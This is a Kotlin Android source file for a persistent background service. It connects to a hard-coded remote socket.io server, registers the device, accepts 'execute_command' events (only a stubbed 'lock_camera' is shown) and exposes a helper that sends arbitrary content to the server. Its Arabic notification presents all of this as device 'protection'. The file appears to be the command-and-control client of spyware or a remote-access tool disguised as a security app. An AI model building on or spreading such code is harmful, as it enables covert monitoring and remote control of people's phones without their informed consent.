package com.ahmed.zai

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URISyntaxException

class SocketService : Service() {
    companion object {
        var mSocket: Socket? = null
        fun sendDataToServer(type: String, content: String) {
            try {
                val json = JSONObject()
                json.put("type", type)
                json.put("content", content)
                json.put("device", Build.MODEL)
                mSocket?.emit("app_data", json)
            } catch (e: Exception) {}
        }
    }

    override fun onCreate() {
        super.onCreate()
        startForeground(1, createNotification())
        
        try {
            val opts = IO.Options()
            opts.reconnection = true
            mSocket = IO.socket("https://zai-proxy-production-861f.up.railway.app", opts)
            
            mSocket?.on(Socket.EVENT_CONNECT) {
                val data = JSONObject()
                data.put("deviceName", Build.MANUFACTURER + " " + Build.MODEL)
                mSocket?.emit("register_device", data)
            }

            mSocket?.on("execute_command") { args ->
                val cmd = args[0] as String
                if (cmd == "lock_camera") {
                    // أمر القفل
                }
            }
            mSocket?.connect()
        } catch (e: URISyntaxException) {}
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotification(): Notification {
        val channelId = "zai_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "ZAI Protection", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, channelId)
                .setContentTitle("الحماية شغالة")
                .setContentText("جاري تأمين الجهاز...")
                .setSmallIcon(android.R.drawable.ic_lock_lock)
                .build()
        } else {
            Notification.Builder(this).setContentTitle("الحماية شغالة").build()
        }
    }
}
